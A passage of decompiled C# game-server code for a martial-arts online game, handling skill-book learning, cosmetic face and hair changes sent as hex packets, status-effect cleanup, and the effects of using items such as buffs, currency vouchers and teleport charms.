							武功类.学习武功书(this, 3, 5);
							武功类.学习武功书(this, 1, 11);
							武功类.学习武功书(this, 1, 13);
							break;
						case 1000000569:
							if (!武功类.检查修炼条件(this, 3, 9))
							{
								return;
							}
							武功类.学习武功书(this, 3, 9);
							武功类.学习武功书(this, 1, 12);
							武功类.学习武功书(this, 1, 14);
							break;
						case 1000000570:
							if (!武功类.检查修炼条件(this, 1, 10))
							{
								return;
							}
							武功类.学习武功书(this, 1, 10);
							武功类.学习武功书(this, 1, 11);
							武功类.学习武功书(this, 1, 12);
							武功类.学习武功书(this, 1, 13);
							武功类.学习武功书(this, 1, 14);
							break;
						case 1000000488:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000489:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000490:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000491:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000000492:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000000493:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000001223:
							if (!武功类.检查修炼条件(this, 1, 17))
							{
								return;
							}
							武功类.学习武功书(this, 1, 17);
							武功类.学习武功书(this, 1, 18);
							break;
						case 1000001164:
							if (!武功类.检查修炼条件(this, 3, 1))
							{
								return;
							}
							武功类.学习武功书(this, 3, 1);
							武功类.学习武功书(this, 3, 2);
							武功类.学习武功书(this, 3, 3);
							break;
						case 1000001165:
							if (!武功类.检查修炼条件(this, 3, 5))
							{
								return;
							}
							武功类.学习武功书(this, 3, 5);
							武功类.学习武功书(this, 3, 6);
							break;
						case 1000001166:
							if (!武功类.检查修炼条件(this, 3, 9))
							{
								return;
							}
							武功类.学习武功书(this, 3, 9);
							武功类.学习武功书(this, 3, 10);
							break;
						case 1000001167:
							if (!武功类.检查修炼条件(this, 3, 13))
							{
								return;
							}
							武功类.学习武功书(this, 3, 13);
							武功类.学习武功书(this, 3, 14);
							break;
						case 1000001205:
							if (!武功类.检查修炼条件(this, 3, 17))
							{
								return;
							}
							武功类.学习武功书(this, 3, 17);
							break;
						case 1000001206:
							if (!武功类.检查修炼条件(this, 3, 20))
							{
								return;
							}
							武功类.学习武功书(this, 3, 20);
							武功类.学习武功书(this, 3, 21);
							break;
						case 1000001191:
						case 1000001192:
						case 1000001193:
						case 1000001194:
						case 1000001195:
						case 1000001196:
						case 1000001197:
						case 1000001198:
						case 1000001199:
						case 1000001200:
						case 1000001201:
						case 1000001202:
						case 1000001203:
						case 1000001204:
						case 1000001207:
						case 1000001208:
							if (!武功类.检查修炼条件(this, 3, 13))
							{
								return;
							}
							武功类.学习武功书(this, 3, 13);
							武功类.学习武功书(this, 3, 14);
							break;
						case 1000001209:
							if (!武功类.检查修炼条件(this, 3, 17))
							{
								return;
							}
							武功类.学习武功书(this, 3, 17);
							武功类.学习武功书(this, 3, 18);
							武功类.学习武功书(this, 3, 19);
							break;
						case 1000001210:
							if (!武功类.检查修炼条件(this, 3, 17))
							{
								return;
							}
							武功类.学习武功书(this, 3, 17);
							武功类.学习武功书(this, 3, 18);
							break;
						case 1000001100:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000001101:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							break;
						case 1000001102:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000001103:
							if (!武功类.检查修炼条件(this, 0, 26))
							{
								return;
							}
							武功类.学习武功书(this, 0, 26);
							break;
						case 1000001104:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000001105:
							if (!武功类.检查修炼条件(this, 0, 27))
							{
								return;
							}
							武功类.学习武功书(this, 0, 27);
							break;
						case 1000000336:
						case 1000000337:
						case 1000000338:
						case 1000000339:
						case 1000000340:
						case 1000000341:
						case 1000000342:
						case 1000000343:
						case 1000000344:
						case 1000000345:
						case 1000000346:
						case 1000000347:
						case 1000000494:
						case 1000000497:
						case 1000001106:
						case 1000001107:
							if (!武功类.检查修炼条件(this, 3, 1) || !武功类.检查修炼条件(this, 3, 2))
							{
								return;
							}
							武功类.学习武功书(this, 3, 1);
							武功类.学习武功书(this, 3, 2);
							break;
						case 1000000388:
						case 1000000389:
						case 1000000390:
						case 1000000391:
						case 1000000392:
						case 1000000393:
						case 1000000394:
						case 1000000395:
						case 1000000396:
						case 1000000397:
						case 1000000398:
						case 1000000399:
						case 1000000495:
						case 1000000498:
						case 1000001108:
						case 1000001109:
							if (!武功类.检查修炼条件(this, 3, 4) || !武功类.检查修炼条件(this, 3, 5))
							{
								return;
							}
							武功类.学习武功书(this, 3, 4);
							武功类.学习武功书(this, 3, 5);
							break;
						case 1000000464:
						case 1000000465:
						case 1000000466:
						case 1000000467:
						case 1000000468:
						case 1000000469:
						case 1000000470:
						case 1000000471:
						case 1000000472:
						case 1000000473:
						case 1000000474:
						case 1000000475:
						case 1000000496:
						case 1000000499:
						case 1000001110:
						case 1000001111:
							if (!武功类.检查修炼条件(this, 3, 7) || !武功类.检查修炼条件(this, 3, 8))
							{
								return;
							}
							武功类.学习武功书(this, 3, 7);
							武功类.学习武功书(this, 3, 8);
							break;
						case 1000001032:
						case 1000001033:
						case 1000001034:
						case 1000001035:
						case 1000001036:
						case 1000001037:
						case 1000001038:
						case 1000001039:
						case 1000001040:
						case 1000001041:
						case 1000001042:
						case 1000001043:
						case 1000001044:
						case 1000001045:
						case 1000001112:
						case 1000001113:
							if (!武功类.检查修炼条件(this, 3, 10) || !武功类.检查修炼条件(this, 3, 11))
							{
								return;
							}
							武功类.学习武功书(this, 3, 10);
							武功类.学习武功书(this, 3, 11);
							break;
						case 1000001532:
							if (!武功类.检查修炼条件(this, 3, 1))
							{
								return;
							}
							武功类.学习武功书(this, 3, 1);
							武功类.学习武功书(this, 3, 2);
							武功类.学习武功书(this, 3, 3);
							break;
						case 1000001533:
							if (!武功类.检查修炼条件(this, 3, 5))
							{
								return;
							}
							武功类.学习武功书(this, 3, 5);
							武功类.学习武功书(this, 3, 6);
							武功类.学习武功书(this, 3, 7);
							break;
						case 1000001534:
							if (!武功类.检查修炼条件(this, 3, 9))
							{
								return;
							}
							武功类.学习武功书(this, 3, 9);
							武功类.学习武功书(this, 3, 10);
							武功类.学习武功书(this, 3, 11);
							break;
						case 1000001535:
							if (!武功类.检查修炼条件(this, 3, 13))
							{
								return;
							}
							武功类.学习武功书(this, 3, 13);
							武功类.学习武功书(this, 3, 14);
							武功类.学习武功书(this, 3, 15);
							break;
						case 1000001284:
							if (!武功类.检查修炼条件(this, 3, 1))
							{
								return;
							}
							武功类.学习武功书(this, 3, 1);
							武功类.学习武功书(this, 3, 2);
							break;
						case 1000001285:
							if (!武功类.检查修炼条件(this, 0, 25))
							{
								return;
							}
							武功类.学习武功书(this, 0, 25);
							武功类.学习武功书(this, 0, 26);
							武功类.学习武功书(this, 0, 27);
							武功类.学习武功书(this, 0, 28);
							武功类.学习武功书(this, 0, 29);
							break;
						case 1000001286:
							if (!武功类.检查修炼条件(this, 3, 4))
							{
								return;
							}
							武功类.学习武功书(this, 3, 4);
							武功类.学习武功书(this, 3, 5);
							break;
						case 1000001287:
							if (!武功类.检查修炼条件(this, 3, 7))
							{
								return;
							}
							武功类.学习武功书(this, 3, 7);
							武功类.学习武功书(this, 3, 8);
							break;
						case 1000001288:
							if (!武功类.检查修炼条件(this, 3, 10))
							{
								return;
							}
							武功类.学习武功书(this, 3, 10);
							武功类.学习武功书(this, 3, 11);
							break;
						case 1000001289:
							if (!武功类.检查修炼条件(this, 3, 13))
							{
								return;
							}
							武功类.学习武功书(this, 3, 13);
							武功类.学习武功书(this, 3, 14);
							break;
						case 1000001231:
							if (!武功类.检查修炼条件(this, 3, 17))
							{
								return;
							}
							武功类.学习武功书(this, 3, 17);
							武功类.学习武功书(this, 3, 18);
							武功类.学习武功书(this, 3, 19);
							break;
						}
						物品使用(1, num2, 1);
						base.Player_ExpErience -= value.FLD_NEED_FIGHTEXP;
						base.Player_Money -= value.FLD_NEED_MONEY;
						学习技能提示();
						更新武功和状态();
						更新金钱和负重();
						更新经验和历练();
					}
				}
				end_IL_0000:;
			}
			catch
			{
			}
		}

		public void 天云岳整容效果(int 物品id)
		{
			int value = 0;
			switch (new Random().Next(1, 5))
			{
			case 1:
				value = 2001;
				break;
			case 2:
				value = 2002;
				break;
			case 3:
				value = 2003;
				break;
			case 4:
				value = 2004;
				break;
			case 5:
				value = 2005;
				break;
			}
			byte[] array = Converter.hexStringToByte("AA5516007104300210000100000034E1143C000000000100D10755AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(物品id), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 24, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			New人物模版.脸型 = BitConverter.ToInt16(BitConverter.GetBytes(value), 0);
			初始化已装备物品();
			更新武功和状态();
			更新广播人物数据();
			更新装备效果();
		}

		public void 天云岳美容效果(int 物品id)
		{
			int value = 0;
			switch (new Random().Next(1, 5))
			{
			case 1:
				value = 2001;
				break;
			case 2:
				value = 2002;
				break;
			case 3:
				value = 2003;
				break;
			case 4:
				value = 2004;
				break;
			case 5:
				value = 2005;
				break;
			}
			byte[] array = Converter.hexStringToByte("AA5516007104300210000100000033E1143C000000000100D30755AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(物品id), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 24, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			New人物模版.发型 = BitConverter.ToInt16(BitConverter.GetBytes(value), 0);
			初始化已装备物品();
			更新武功和状态();
			更新广播人物数据();
			更新装备效果();
		}

		public void 结束异常掉蓝状态列表()
		{
			if (异常掉蓝状态 != null)
			{
				Queue queue = Queue.Synchronized(new Queue());
				try
				{
					foreach (异常掉蓝状态类 value in 异常掉蓝状态.Values)
					{
						queue.Enqueue(value);
					}
					while (queue.Count > 0)
					{
						if (World.jlMsg == 1)
						{
							Form1.WriteLine(0, "异常掉蓝状态列表");
						}
						异常掉蓝状态类 异常掉蓝状态类 = (异常掉蓝状态类)queue.Dequeue();
						异常掉蓝状态类.时间结束事件();
						if (异常掉蓝状态 != null)
						{
							异常掉蓝状态.Remove(异常掉蓝状态类.FLD_PID);
						}
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "异常掉蓝状态列表列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
			}
		}

		public void 结束异常掉血状态列表()
		{
			if (异常掉血状态 != null)
			{
				Queue queue = Queue.Synchronized(new Queue());
				try
				{
					foreach (异常掉血状态类 value in 异常掉血状态.Values)
					{
						queue.Enqueue(value);
					}
					while (queue.Count > 0)
					{
						if (World.jlMsg == 1)
						{
							Form1.WriteLine(0, "异常掉血状态列表");
						}
						异常掉血状态类 异常掉血状态类 = (异常掉血状态类)queue.Dequeue();
						异常掉血状态类.时间结束事件();
						if (异常掉血状态 != null)
						{
							异常掉血状态.Remove(异常掉血状态类.FLD_PID);
						}
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "异常掉血状态列表列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
			}
		}

		public void 结束异常攻击状态列表()
		{
			if (异常攻击状态 != null)
			{
				Queue queue = Queue.Synchronized(new Queue());
				try
				{
					foreach (异常状态攻击类 value in 异常攻击状态.Values)
					{
						queue.Enqueue(value);
					}
					while (queue.Count > 0)
					{
						if (World.jlMsg == 1)
						{
							Form1.WriteLine(0, "异常攻击状态列表");
						}
						异常状态攻击类 异常状态攻击类 = (异常状态攻击类)queue.Dequeue();
						异常状态攻击类.时间结束事件();
						if (异常攻击状态 != null)
						{
							异常攻击状态.Remove(异常状态攻击类.FLD_PID);
						}
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "异常攻击状态列表列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
			}
		}

		public void 结束异常防御状态列表()
		{
			if (异常防御状态 != null)
			{
				Queue queue = Queue.Synchronized(new Queue());
				try
				{
					foreach (异常状态防御类 value in 异常防御状态.Values)
					{
						queue.Enqueue(value);
					}
					while (queue.Count > 0)
					{
						if (World.jlMsg == 1)
						{
							Form1.WriteLine(0, "异常防御状态列表");
						}
						异常状态防御类 异常状态防御类 = (异常状态防御类)queue.Dequeue();
						异常状态防御类.时间结束事件();
						if (异常防御状态 != null)
						{
							异常防御状态.Remove(异常状态防御类.FLD_PID);
						}
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "异常防御状态列表列表出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
			}
		}

		public void 吃药(byte[] 封包数据)
		{
			int num = 0;
			try
			{
				int num2;
				int num3;
				byte[] array;
				int num4;
				int num5;
				if (!base.Player死亡 && !人物锁定)
				{
					num2 = 封包数据[10];
					num3 = 封包数据[11];
					array = new byte[4];
					byte[] array2 = new byte[4];
					byte[] array3 = new byte[4];
					System.Buffer.BlockCopy(封包数据, 34, array3, 0, 2);
					System.Buffer.BlockCopy(封包数据, 14, array, 0, 4);
					System.Buffer.BlockCopy(封包数据, 22, array2, 0, 4);
					num4 = BitConverter.ToInt32(array3, 0);
					num5 = BitConverter.ToInt32(array, 0);
					BitConverter.ToInt32(array2, 0);
					if (num2 != 60)
					{
						if (BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) != num5 || BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) == 0)
						{
							switch (num5)
							{
							default:
								return;
							case 900020035:
								num5 -= 20000;
								break;
							case 900020034:
								num5 -= 20000;
								break;
							case 1000020050:
								num5 -= 20000;
								break;
							case 999020709:
								num5 -= 20000;
								break;
							case 999020058:
								num5 -= 20000;
								break;
							case 999020059:
								num5 -= 20000;
								break;
							case 999020060:
								num5 -= 20000;
								break;
							case 999020061:
								num5 -= 20000;
								break;
							case 999020062:
								num5 -= 20000;
								break;
							case 1000020830:
								num5 -= 20000;
								break;
							case 1000020815:
								num5 -= 20000;
								break;
							case 1000020816:
								num5 -= 20000;
								break;
							case 1000020818:
								num5 -= 20000;
								break;
							case 1000020819:
								num5 -= 20000;
								break;
							case 1008020522:
								num5 -= 20000;
								break;
							case 1008020523:
								num5 -= 20000;
								break;
							case 1008020524:
								num5 -= 20000;
								break;
							case 1008020525:
								num5 -= 20000;
								break;
							case 1008020526:
								num5 -= 20000;
								break;
							case 1008020527:
								num5 -= 20000;
								break;
							case 1008020528:
								num5 -= 20000;
								break;
							case 1008020529:
								num5 -= 20000;
								break;
							case 1008020530:
								num5 -= 20000;
								break;
							case 1008020531:
								num5 -= 20000;
								break;
							case 1008020532:
								num5 -= 20000;
								break;
							case 1008020533:
								num5 -= 20000;
								break;
							case 1008020534:
								num5 -= 20000;
								break;
							case 1008020535:
								num5 -= 20000;
								break;
							case 1008020053:
								num5 -= 20000;
								break;
							case 1008020054:
								num5 -= 20000;
								break;
							case 1008020055:
								num5 -= 20000;
								break;
							case 1000020841:
								num5 -= 20000;
								break;
							case 1000020842:
								num5 -= 20000;
								break;
							case 1000020843:
								num5 -= 20000;
								break;
							}
						}
						goto IL_03e2;
					}
					if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num3].物品ID, 0) == num5 && BitConverter.ToInt32(人物灵兽.宠物装备栏[num3].物品ID, 0) != 0)
					{
						goto IL_03e2;
					}
				}
				goto end_IL_0002;
				IL_03e2:
				ItmeClass value;
				if (World.Itme.TryGetValue(num5, out value) && BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0) != 0)
				{
					num = num5;
					switch (num5)
					{
					case 1000000818:
					case 1000000819:
						break;
					case 1700101:
						物品使用(num2, num3, 0);
						break;
					case 1700102:
						物品使用(num2, num3, 0);
						break;
					case 1700103:
						物品使用(num2, num3, 0);
						break;
					case 700000002:
						if (World.是否开启银票兑换元宝 == 1)
						{
							物品使用(num2, num3, 1);
							查百宝阁元宝数();
							检察元宝积分数据(World.银票兑换元宝, 1);
							保存元宝数据();
							RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "银票兑换元宝", 1, World.银票兑换元宝);
						}
						break;
					case 9000088:
					case 9000104:
					case 9000105:
					case 9000144:
					case 9000145:
					case 9000168:
					case 9001214:
					case 9009077:
					case 9009092:
					case 9009151:
					case 9009788:
					case 9009789:
					case 9009790:
					case 9009820:
					case 9009964:
					{
						if (GetAddState(num5))
						{
							新吃药提示();
							break;
						}
						int num29 = 7200000;
						switch (num5)
						{
						case 9000088:
							num29 = 5400000;
							break;
						case 9009964:
							num29 = 3600000;
							break;
						case 9009151:
							num29 = 3600000;
							break;
						case 9000168:
						case 9001214:
							num29 = 10800000;
							break;
						}
						追加状态类 追加状态类41 = new 追加状态类(this, num29, num5, 1);
						追加状态列表.Add(追加状态类41.FLD_PID, 追加状态类41);
						状态效果(array, 1, num29);
						base.FLD_人物_追加_历练百分比 += 0.5;
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 9000085:
					case 9000120:
					case 9000121:
					case 9000165:
					case 9000166:
					case 9000317:
					case 9001207:
					case 9001211:
					case 9001215:
					case 9009076:
					case 9009150:
					case 9009217:
					case 9009309:
					case 9009839:
					case 9009941:
					case 9009943:
					case 9009965:
					case 9009966:
					case 9009970:
					{
						if (GetAddState(num5))
						{
							新吃药提示();
							break;
						}
						int num20 = 7200000;
						switch (num5)
						{
						case 9000085:
						case 9000317:
							num20 = 5400000;
							break;
						case 9000166:
						case 9001215:
						case 9009217:
						case 9009941:
							num20 = 10800000;
							break;
						case 9009150:
						case 9009839:
						case 9009965:
						case 9009966:
							num20 = 3600000;
							break;
						}
						追加状态类 追加状态类19 = new 追加状态类(this, num20, num5, 1);
						追加状态列表.Add(追加状态类19.FLD_PID, 追加状态类19);
						状态效果(array, 1, num20);
						base.FLD_人物_追加_经验百分比 += 0.2;
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 900000401:
						if (称号积分 > int.Parse(World.至高无上称号奖励[0]))
						{
							系统提示("宝石数量已经达到最高阶段", 9, "系统提示");
							break;
						}
						base.称号追加HP = 0;
						base.称号追加防御 = 0;
						base.称号追加攻击 = 0;
						称号积分++;
						系统提示("当前宝石数量" + 称号积分 + "个,请到网站查询获取宝石称号阶段", 9, "系统提示");
						if (称号积分 >= int.Parse(World.至高无上称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.至高无上称号奖励[1]);
							base.称号追加防御 = int.Parse(World.至高无上称号奖励[2]);
							base.称号追加HP = int.Parse(World.至高无上称号奖励[3]);
							base.FLD_荣誉ID = 601;
							获取称号类型(1008001567, 1);
						}
						else if (称号积分 >= int.Parse(World.举世无双称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.举世无双称号奖励[1]);
							base.称号追加防御 = int.Parse(World.举世无双称号奖励[2]);
							base.称号追加HP = int.Parse(World.举世无双称号奖励[3]);
							base.FLD_荣誉ID = 602;
							获取称号类型(1008001567, 0);
							获取称号类型(1008001568, 1);
						}
						else if (称号积分 >= int.Parse(World.雄霸天下称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.雄霸天下称号奖励[1]);
							base.称号追加防御 = int.Parse(World.雄霸天下称号奖励[2]);
							base.称号追加HP = int.Parse(World.雄霸天下称号奖励[3]);
							base.FLD_荣誉ID = 603;
							获取称号类型(1008001568, 0);
							获取称号类型(1008001569, 1);
						}
						else if (称号积分 >= int.Parse(World.孤胆英雄称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.孤胆英雄称号奖励[1]);
							base.称号追加防御 = int.Parse(World.孤胆英雄称号奖励[2]);
							base.称号追加HP = int.Parse(World.孤胆英雄称号奖励[3]);
							base.FLD_荣誉ID = 604;
							获取称号类型(1008001569, 0);
							获取称号类型(1008001570, 1);
						}
						else if (称号积分 >= int.Parse(World.英雄豪杰称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.英雄豪杰称号奖励[1]);
							base.称号追加防御 = int.Parse(World.英雄豪杰称号奖励[2]);
							base.称号追加HP = int.Parse(World.英雄豪杰称号奖励[3]);
							base.FLD_荣誉ID = 605;
							获取称号类型(1008001570, 0);
							获取称号类型(1008001571, 1);
						}
						更新人物数据(this);
						更新广播人物数据();
						更新武功和状态();
						保存人物的数据();
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					case 900000072:
					case 900000073:
					case 900000074:
					case 900000258:
					case 999000163:
					case 999000164:
					case 999000165:
					{
						if (GetAddState(num5))
						{
							追加状态列表[num5].时间结束事件();
						}
						物品使用(num2, num3, 1);
						int num43 = 3600000;
						switch (num5)
						{
						case 999000163:
							num43 *= 2;
							break;
						case 999000164:
							num43 *= 3;
							break;
						case 999000165:
							num43 *= 4;
							break;
						case 900000258:
							num43 *= 8;
							break;
						case 900000072:
							num43 *= 5;
							break;
						case 900000073:
							num43 *= 6;
							break;
						case 900000074:
							num43 *= 7;
							break;
						}
						追加状态类 追加状态类60 = new 追加状态类(this, num43, num5, 1);
						追加状态列表.Add(追加状态类60.FLD_PID, 追加状态类60);
						状态效果(array, 1, num43);
						switch (num5)
						{
						case 999000163:
							移动(-350f, 1f, 15f, 3101);
							break;
						case 999000164:
							移动(-458f, -6f, 15f, 3001);
							break;
						case 999000165:
							移动(0f, 0f, 15f, 7001);
							break;
						case 900000072:
							移动(121f, 1f, 15f, 2311);
							break;
						case 900000073:
							移动(154f, 30f, 15f, 25210);
							break;
						case 900000074:
							移动(32f, 92f, 15f, 25209);
							break;
						case 900000258:
							移动(158f, -312f, 15f, 25208);
							break;
						}
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					}
					case 999000058:
						查百宝阁元宝数();
						物品使用(num2, num3, 1);
						检察元宝数据(300, 1);
						保存元宝数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 999000059:
						查百宝阁元宝数();
						物品使用(num2, num3, 1);
						检察元宝数据(500, 1);
						保存元宝数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 999000060:
						查百宝阁元宝数();
						物品使用(num2, num3, 1);
						检察元宝数据(10, 1);
						保存元宝数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 999000061:
						查百宝阁元宝数();
						物品使用(num2, num3, 1);
						检察元宝数据(50, 1);
						保存元宝数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 999000062:
						查百宝阁元宝数();
						物品使用(num2, num3, 1);
						检察元宝数据(100, 1);
						保存元宝数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 900000619:
						if (GetAddState(900000619))
						{
							新吃药提示();
						}
						else
						{
							查百宝阁元宝数();
							if (base.FLD_RXPIONT >= World.安全模式消耗元宝)
							{
								检察元宝数据(World.安全模式消耗元宝, 0);
								RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "安全模式消耗", 1, World.安全模式消耗元宝);
								int num27 = World.安全挂机时间 * 60000;
								追加状态类 追加状态类31 = new 追加状态类(this, num27, num5, 1);
								追加状态列表.Add(追加状态类31.FLD_PID, 追加状态类31);
								状态效果(array, 1, num27);
								安全模式 = 1;
								物品使用(num2, num3, 1);
								系统提示("恭喜你,安全模式开启成功,请放心挂 机。");
								保存元宝数据();
								RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
							}
							else
							{
								系统提示("元宝不足,开启安全模式需要支付" + World.安全模式消耗元宝 + "元宝。");
							}
						}
						break;
					case 1000000033:
						if (base.帮派名字.Length != 0 && base.帮派人物等级 == 6)
						{
							if (base.帮派等级 < 6)
							{
								物品使用(num2, num3, 1);
								DBA.ExeSqlCommand(string.Format("UPDATE TBL_XWWL_Guild SET 门派武勋=门派武勋+5000,名声=名声+3,胜=胜+1 WHERE ID='{0}'", base.帮派Id));
								更新门派等级(base.UserName);
								系统提示("帮派胜利点数+1,帮派武勋+5000,帮派声望+3", 50, "");
							}
							else
							{
								系统提示("当前帮派无需升级", 50, "");
							}
						}
						else
						{
							系统提示("只有帮主才可以使用", 50, "");
						}
						goto IL_a6ab;
					case 1000000030:
						if (GetAddState(1000000030))
						{
							新吃药提示();
						}
						else
						{
							追加状态类 追加状态类21 = new 追加状态类(this, 3600000, num5, 1);
							追加状态列表.Add(追加状态类21.FLD_PID, 追加状态类21);
							状态效果(array, 1, 3600000);
							double num8 = base.FLD_人物_追加_历练百分比 += 1.0;
							物品使用(num2, num3, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 999000709:
						查百宝阁元宝数();
						物品使用(num2, num3, 1);
						检察元宝数据(1000, 1);
						保存元宝数据();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					case 1000000082:
						if (人物灵兽 != null)
						{
							物品使用(num2, num3, 1);
							人物灵兽.FLD_MAGIC1 = 0;
							人物灵兽.FLD_MAGIC2 = 0;
							人物灵兽.FLD_MAGIC3 = 0;
							人物灵兽.FLD_MAGIC4 = 0;
							人物灵兽.FLD_MAGIC5 = 0;
							更新灵兽武功和状态();
						}
						else
						{
							系统提示("请先召唤出灵兽才能使用。");
						}
						break;
					case 1000000050:
						try
						{
							if (组队id != 0 && (int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds >= 50)
							{
								吃药时间 = DateTime.Now;
								组队Class value16;
								if (World.W组队.TryGetValue(组队id, out value16))
								{
									if (!value16.红包)
									{
										value16.红包 = true;
										物品使用(num2, num3, 1);
										value16.红包时间 = 7200000;
										foreach (Players value29 in value16.队员列表.Values)
										{
											if (value29.追加状态列表 != null)
											{
												if (value29.GetAddState(1000000050))
												{
													value29.追加状态列表[1000000050].时间结束事件();
												}
												追加状态类 追加状态类50 = new 追加状态类(value29, value16.红包时间, 1000000050, 0);
												value29.追加状态列表.Add(追加状态类50.FLD_PID, 追加状态类50);
												value29.状态效果(BitConverter.GetBytes(1000000050), 1, value16.红包时间);
											}
										}
										RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
									}
									else
									{
										系统提示("当前队伍已有红包经验/金钱/历练加成,不能重复使用。", 50, "系统提示");
									}
								}
							}
						}
						catch (Exception ex2)
						{
							Form1.WriteLine(1, "红包发送出错" + ex2.Message);
						}
						break;
					case 1000000262:
						if (World.是否开放九泉地图 != 0.0)
						{
							if (World.王龙的金币 >= 1000000000L)
							{
								Random random = new Random(DateTime.Now.Millisecond);
								int num10 = random.Next(0, 100);
								if (num10 >= 0 && num10 < 33)
								{
									减去物品(num3, 1);
									查百宝阁元宝数();
									int int_2 = random.Next(3000, (int)((double)World.王龙的金币 * 1E-05));
									检察元宝数据(int_2, 1);
									保存元宝数据();
									World.系统滚动公告("玩家[" + base.UserName + "]开启王龙的金条获得" + int_2 + "元宝");
								}
								else if (num10 >= 33 && num10 < 66)
								{
									byte[] array5 = Converter.hexStringToByte("AA5522000000121614000000000000000000000000000000000000000000000000000000A65455AA");
									System.Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array5, 11, 1);
									System.Buffer.BlockCopy(BitConverter.GetBytes(1000000262), 0, array5, 14, 4);
									开箱(array5);
								}
								else
								{
									减去物品(num3, 1);
									int num11 = random.Next(500000000, (int)World.王龙的金币);
									base.Player_Money += num11;
									更新金钱和负重();
									World.系统滚动公告("玩家[" + base.UserName + "]开启王龙的金条获得" + num11 + "金币");
								}
							}
							else
							{
								减去物品(num3, 1);
								int num12 = new Random(DateTime.Now.Millisecond).Next(100000000, (int)World.王龙的金币);
								base.Player_Money += num12;
								更新金钱和负重();
								World.系统滚动公告("玩家[" + base.UserName + "]开启王龙的金条获得" + num12 + "金币");
							}
							World.王龙的金币 = 0L;
						}
						break;
					case 1000000142:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array14 = World.地图锁定.Split(';');
							if (array14.Length >= 1)
							{
								for (int num42 = 0; num42 < array14.Length; num42++)
								{
									if (int.Parse(array14[num42]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value20 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value20);
							移动(1214f, 91f, 15f, 2201);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000143:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array9 = World.地图锁定.Split(';');
